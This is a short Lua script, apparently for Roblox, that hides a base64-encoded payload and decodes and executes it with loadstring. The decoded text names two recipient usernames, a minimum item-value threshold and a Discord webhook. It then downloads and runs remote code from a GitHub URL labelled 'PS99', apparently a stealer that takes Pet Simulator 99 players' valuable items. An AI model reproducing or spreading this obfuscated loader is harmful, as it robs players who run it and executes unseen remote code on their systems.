
local encodedScript = "VXNlcm5hbWUgPSAiWlcyOUEiClVzZXJuYW1lMiA9ICJ4enhpb3B4IgpNaW5pbXVtUkFQID0gMTAwMDAKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuZ2cvNzZSa0E3QjQiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3llc2xpZGV6ei9Fa3MwdmEvbWFpbi9QUzk5IikpKCk="

local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

loadstring(decode(encodedScript))()
